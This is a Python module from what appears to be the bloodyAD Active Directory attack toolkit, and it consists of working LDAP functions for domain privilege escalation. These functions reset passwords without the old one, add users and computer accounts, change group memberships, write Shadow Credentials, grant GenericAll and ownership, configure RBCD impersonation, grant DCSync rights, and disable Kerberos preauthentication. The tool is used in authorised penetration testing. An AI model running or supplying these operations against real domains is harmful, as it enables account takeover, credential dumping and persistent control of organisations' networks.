from bloodyAD.exceptions import BloodyError, ResultError
from bloodyAD import utils
from bloodyAD.utils import (
    resolvDN,
    getDefaultNamingContext,
    setAttr,
    getObjectSID,
)
from bloodyAD.utils import getSD, addRight, delRight
from bloodyAD.utils import addShadowCredentials, delShadowCredentials
from bloodyAD.utils import LOG
from bloodyAD.formatters import accesscontrol, formatters
import ldap3
import json
from functools import wraps
from ldap3.extend.microsoft import (
    addMembersToGroups,
    modifyPassword,
    removeMembersFromGroups,
)
from ldap3.protocol.formatters.formatters import format_sid


functions = []


def register_module(f):
    functions.append((f.__name__, f))

    @wraps(f)
    def wrapper(*args, **kwds):
        return f(*args, **kwds)

    return wrapper


@register_module
def getObjectAttributes(conn, identity, attr="*", fetchSD="False"):
    """
    Fetch LDAP attributes for the identity (group or user) provided
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
        attr: attributes to fetch separated with ',' (default fetch all attributes)
        fetchSD: If True, fetch security descriptor permissions (default is False)
    """
    fetchSD = fetchSD == "True"
    control_flag = accesscontrol.OWNER_SECURITY_INFORMATION
    if fetchSD:
        control_flag += (
            accesscontrol.GROUP_SECURITY_INFORMATION
            + accesscontrol.DACL_SECURITY_INFORMATION
        )
    utils.search(conn, identity, attr=attr, control_flag=control_flag)
    print(
        json.dumps(
            json.loads(conn.getLdapConnection().response_to_json())["entries"][0][
                "attributes"
            ],
            indent=4,
            sort_keys=True,
        )
    )


@register_module
def setAttribute(conn, identity, attribute, value):
    """
    Add or replace an attribute of an object
    Args:
        identity: sAMAccountName, DN, GUID or SID of the object
        attribute: Name of the attribute
        value: jSON array (e.g ["john.doe"])
    """
    value = json.loads(value)
    setAttr(conn, identity, attribute, value)


@register_module
def addUser(conn, sAMAccountName, password, ou=None):
    """
    Add a new user in the LDAP database
    By default the user object is put in the OU Users
    This can be changed with the ou parameter
    Args:
        identity: sAMAccountName of the target
        password: the password that will be set for the user account
        ou: Optional parameters - Where to put the user object in the LDAP directory
    """
    ldap_conn = conn.getLdapConnection()

    if ou:
        user_dn = f"cn={sAMAccountName},{ou}"
    else:
        naming_context = getDefaultNamingContext(ldap_conn)
        user_dn = f"cn={sAMAccountName},cn=Users,{naming_context}"

    attr = {
        "objectClass": ["top", "person", "organizationalPerson", "user"],
        "distinguishedName": user_dn,
        "sAMAccountName": sAMAccountName,
        "userAccountControl": 544,
        "unicodePwd": ('"%s"' % password).encode("utf-16-le"),
    }

    ldap_conn.add(user_dn, attributes=attr)

    if ldap_conn.result["description"] == "success":
        LOG.info(f"[+] {sAMAccountName} has been successfully added")
    else:
        raise BloodyError(ldap_conn.result["description"])


@register_module
def addComputer(conn, hostname, password, ou=None):
    """
    Add a new computer in the AD database
    By default the computer object is put in the OU CN=Computers
    This can be changed with the ou parameter
    Args:
        hostname: computer name (without the trailing $ symbol)
        password: the password that will be set for the computer account
        ou: Optional parameters - Where to put the computer object in the LDAP directory
    """
    cnf = conn.conf
    ldap_conn = conn.getLdapConnection()

    if ou:
        computer_dn = f"cn={hostname},{ou}"
    else:
        naming_context = getDefaultNamingContext(ldap_conn)
        computer_dn = f"cn={hostname},cn=Computers,{naming_context}"

    # Default computer SPNs
    spns = [
        "HOST/%s" % hostname,
        "HOST/%s.%s" % (hostname, cnf.domain),
        "RestrictedKrbHost/%s" % hostname,
        "RestrictedKrbHost/%s.%s" % (hostname, cnf.domain),
    ]
    attr = {
        "objectClass": [
            "top",
            "person",
            "organizationalPerson",
            "user",
            "computer",
        ],
        "dnsHostName": "%s.%s" % (hostname, cnf.domain),
        "userAccountControl": 0x1000,
        "servicePrincipalName": spns,
        "sAMAccountName": f"{hostname}$",
        "unicodePwd": ('"%s"' % password).encode("utf-16-le"),
    }

    ldap_conn.add(computer_dn, attributes=attr)

    if ldap_conn.result["description"] == "success":
        LOG.info(f"[+] {hostname} has been successfully added")
    else:
        raise BloodyError(ldap_conn.result["description"])


@register_module
def delObject(conn, identity):
    """
    Delete an object (user or group) from the Directory based on the identity provided
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
    """
    ldap_conn = conn.getLdapConnection()
    dn = resolvDN(ldap_conn, identity)
    LOG.debug(f"[*] Trying to remove {dn}")
    ldap_conn.delete(dn)
    LOG.info(f"[-] {dn} has been removed")


@register_module
def changePassword(conn, identity, new_pass):
    """
    Change the target password without knowing the old one using LDAPS or RPC
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        new_pass: new password for the target
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, identity)

    modifyPassword.ad_modify_password(ldap_conn, target_dn, new_pass, old_password=None)
    if ldap_conn.result["result"] != 0:
        raise ResultError(ldap_conn.result)

    LOG.info("[+] Password changed successfully!")


@register_module
def addObjectToGroup(conn, member, group):
    """
    Add an object to a group
        member: sAMAccountName, DN, GUID or SID of the object to add to the group
        group: sAMAccountName, DN, GUID or SID of the group
    """
    ldap_conn = conn.getLdapConnection()
    member_dn = resolvDN(ldap_conn, member)
    LOG.debug(f"[*] {member} found at {member_dn}")
    group_dn = resolvDN(ldap_conn, group)
    LOG.debug(f"[*] {group} found at {group_dn}")
    addMembersToGroups.ad_add_members_to_groups(
        ldap_conn, member_dn, group_dn, raise_error=True
    )
    LOG.info(f"[+] {member_dn} added to {group_dn}")


@register_module
def addForeignObjectToGroup(conn, user_sid, group):
    """
    Add foreign principals (users or groups), coming from a trusted domain, to a group
    Args:
        user_sid: foreign object sid
        group: sAMAccountName, DN, GUID or SID of the group
    """
    ldap_conn = conn.getLdapConnection()
    # https://social.technet.microsoft.com/Forums/en-US/6b7217e1-a197-4e24-9357-351c2d23edfe/ldap-query-to-add-foreignsecurityprincipals-to-a-group?forum=winserverDS
    magic_user_dn = f"<SID={user_sid}>"
    group_dn = resolvDN(ldap_conn, group)
    LOG.debug(f"[*] {group} found at {group_dn}")
    try:
        addMembersToGroups.ad_add_members_to_groups(
            ldap_conn, magic_user_dn, group_dn, raise_error=True
        )
        LOG.info(f"[+] {user_sid} added to {group_dn}")
    except ldap3.core.exceptions.LDAPEntryAlreadyExistsResult:
        LOG.warning(f"[!] {user_sid} already exists in {group_dn}")


@register_module
def delObjectFromGroup(conn, member, group):
    """
    Remove member from group
    Args:
        member: sAMAccountName, DN, GUID or SID of the object to delete from the group
        group: sAMAccountName, DN, GUID or SID of the group
    """
    ldap_conn = conn.getLdapConnection()
    member_dn = resolvDN(ldap_conn, member)
    group_dn = resolvDN(ldap_conn, group)
    removeMembersFromGroups.ad_remove_members_from_groups(
        ldap_conn, member_dn, group_dn, True, raise_error=True
    )
    LOG.info(f"[-] {member} removed from {group_dn}")


@register_module
def getChildObjects(conn, parent_obj, object_type="*"):
    """
    List the child objects of an object
    Args:
        base_obj: DN of the targeted parent object
        object_type: the type of object to fetch (user/computer or * to have them all)
    """
    res = utils.search(
        conn,
        parent_obj,
        f"(objectClass={object_type})",
        search_scope=ldap3.LEVEL,
        attr="",
    )
    res = [entry["dn"] for entry in res]
    print(json.dumps(res, indent=4, sort_keys=True))
    return res


@register_module
def search(conn, search_base, ldap_filter, attr="*"):
    """
    Search in LDAP database
    Args:
        search_base: DN of the parent object
        ldap_filter: Filter to apply to the LDAP search (see LDAP filter syntax)
        attr: attributes to fetch (default is '*')
    """
    utils.search(
        conn,
        search_base,
        ldap_filter,
        search_scope=ldap3.SUBTREE,
        attr=attr.split(","),
    )
    print(json.loads(conn.getLdapConnection().response_to_json()))


@register_module
def setShadowCredentials(
    conn, identity, enable="True", outfilePath=None, rsakey_sha256=None
):
    """
    Add or delete attribute allowing to authenticate as the user provided using a crafted certificate (Shadow Credentials)
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        enable: True to add Shadow Credentials for the user or False to remove it (default is True)
        outfilePath: file path for the generated certificate (default is current path)
        rsakey_sha256: rsakey_sha256 of the shadow credentials to remove from the target object (default is all)
    """
    if enable == "True":
        addShadowCredentials(conn, identity, outfilePath)
    else:
        delShadowCredentials(conn, identity, rsakey_sha256)


@register_module
def setGenericAll(conn, identity, target, enable="True"):
    """
    Give permission to an AD object to modify the properties of another object
    Args:
        identity: sAMAccountName, DN, GUID or SID of the object you control
        target:  sAMAccountName, GPO name, DN, GUID or SID
        enable: True to add GenericAll for the user or False to remove it (default is True)
    """
    enable = enable == "True"
    ldap_attribute = "nTSecurityDescriptor"
    control_flag = accesscontrol.DACL_SECURITY_INFORMATION
    access_mask = accesscontrol.ACCESS_FLAGS["FULL_CONTROL"]
    new_sd, old_raw_sd = getSD(conn, target)
    user_sid = getObjectSID(conn, identity)

    if enable:
        isChanged = addRight(new_sd, user_sid, access_mask)
        log = f"[+] {identity} has now GenericAll on {target}"
    else:
        isChanged = delRight(new_sd, user_sid, access_mask)
        log = f"[-] {identity} doesn't have GenericAll on {target} anymore"

    setAttr(conn, target, ldap_attribute, [new_sd.getData()], control_flag)

    LOG.info(log)
    return old_raw_sd if isChanged else None


@register_module
def setOwner(conn, identity, target):
    """
    Set an AD object as the owner of the target object
    Args:
        identity: sAMAccountName, DN, GUID or SID of your user (You must be Domain Admins to set another user)
        target: sAMAccountName, DN, GUID or SID of the targeted object (You must have WriteOwner permission on it)
    """
    ldap_attribute = "nTSecurityDescriptor"
    new_sd, _ = getSD(
        conn, target, ldap_attribute, accesscontrol.OWNER_SECURITY_INFORMATION
    )
    new_sid = format_sid(getObjectSID(conn, identity))

    old_sid = new_sd["OwnerSid"].formatCanonical()
    if old_sid == new_sid:
        LOG.warning(f"[!] {old_sid} is already the owner, no modification will be made")
        old_sid = None
    else:
        new_sd["OwnerSid"].fromCanonical(format_sid(new_sid))
        setAttr(conn, target, ldap_attribute, new_sd.getData())
        LOG.info(f"[+] Old owner {old_sid} is now replaced by {identity} on {target}")

    return old_sid


@register_module
def setRbcd(conn, spn, target, enable="True"):
    """
    Set Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
    Args:
        spn: sAMAccountName, DN, GUID or SID of the SPN
        target: sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
        enable: True to add Rbcd and False to remove it (default is True)
    """
    enable = enable == "True"
    ldap_attribute = "msDS-AllowedToActOnBehalfOfOtherIdentity"
    control_flag = 0
    access_mask = accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
    new_sd, old_raw_sd = getSD(conn, target, ldap_attribute, control_flag)
    spn_sid = getObjectSID(conn, spn)

    if enable:
        isChanged = addRight(new_sd, spn_sid, access_mask)
        log = f"[+] {spn} can now impersonate users on {target} via S4U2Proxy"
    else:
        isChanged = delRight(new_sd, spn_sid, access_mask)
        log = f"[-] {spn} can't impersonate users on {target} anymore"

    attr_values = []
    if len(new_sd["Dacl"].aces) > 0:
        attr_values.append(new_sd.getData())
    setAttr(conn, target, ldap_attribute, attr_values, control_flag)

    LOG.info(log)
    return old_raw_sd if isChanged else None


@register_module
def setDCSync(conn, identity, enable="True"):
    """
    Set the right to perform DCSync with the user provided (You must have write permission on the domain LDAP object)
    Args:
        identity: sAMAccountName, DN, GUID or SID of the user
        enable: True to add DCSync and False to remove it (default is True)
    """
    enable = enable == "True"
    ldap_attribute = "nTSecurityDescriptor"
    control_flag = accesscontrol.DACL_SECURITY_INFORMATION
    access_mask = accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
    domain_dn = getDefaultNamingContext(conn.getLdapConnection())
    new_sd, old_raw_sd = getSD(conn, domain_dn)
    user_sid = getObjectSID(conn, identity)

    if enable:
        isChanged = addRight(new_sd, user_sid, access_mask)
        log = f"[+] {identity} is now able DCSync"
    else:
        isChanged = delRight(new_sd, user_sid, access_mask)
        log = f"[-] {identity} can't DCSync anymore"

    setAttr(conn, domain_dn, ldap_attribute, new_sd.getData(), control_flag)

    LOG.info(log)
    return old_raw_sd if isChanged else None


@register_module
def setUserAccountControl(conn, identity, flags, enable="True"):
    """
    Enable or disable the flags for the given user (must have a write permission on the UserAccountControl attribute of the target user)
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target
        flags: hexadecimal value corresponding to flags to set (e.g for DONT_REQ PREAUTH: 0x400000)
        enable: True to add the flags or False to delete them (default is True)
    """
    enable = enable == "True"
    flags = int(flags, 16)

    response = utils.search(conn, identity, attr="userAccountControl")[0]
    LOG.debug(
        "[*] Original userAccountControl: "
        + str(response["attributes"]["userAccountControl"])
    )
    rawAccountControl = int(
        response["raw_attributes"]["userAccountControl"][0].decode()
    )

    if enable:
        rawAccountControl = rawAccountControl | flags
    else:
        rawAccountControl = rawAccountControl & ~flags

    setAttribute(conn, identity, "userAccountControl", str(rawAccountControl))
